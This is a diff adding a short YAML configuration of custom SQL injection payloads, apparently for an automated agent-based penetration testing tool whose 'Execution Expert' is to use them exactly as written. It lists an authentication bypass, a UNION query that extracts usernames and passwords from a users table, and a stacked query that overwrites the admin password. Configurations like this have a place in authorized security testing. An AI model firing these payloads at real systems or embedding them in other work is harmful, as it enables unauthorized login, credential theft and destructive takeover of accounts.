@@ -1,0 +1,25 @@
+# Custom SQL Injection Payloads
+# -----------------------
+# This file is intentionally empty to use the Payload Engineer's suggestions
+# Add payloads under the 'payloads:' section to override
+
+#payloads: []
+
+# Replace with:
+
+# Custom SQL Injection Payloads
+# -----------------------
+# The SQL Injection Execution Expert will use these payloads EXACTLY as written
+# No modifications will be made to these payloads, even for password fields
+
+payloads:
+  # Authentication bypass payloads
+  - "' OR 1=1 --"
+  - "admin' --"
+  
+  # Custom payloads for specific targets
+  - "' UNION SELECT username, password FROM users --"
+  - "'; UPDATE users SET password='hacked' WHERE username='admin'; --"
+  
+  # Special test payload with unique syntax
+  - "CUSTOM_PAYLOAD_WITH_NO_MODIFICATION" 
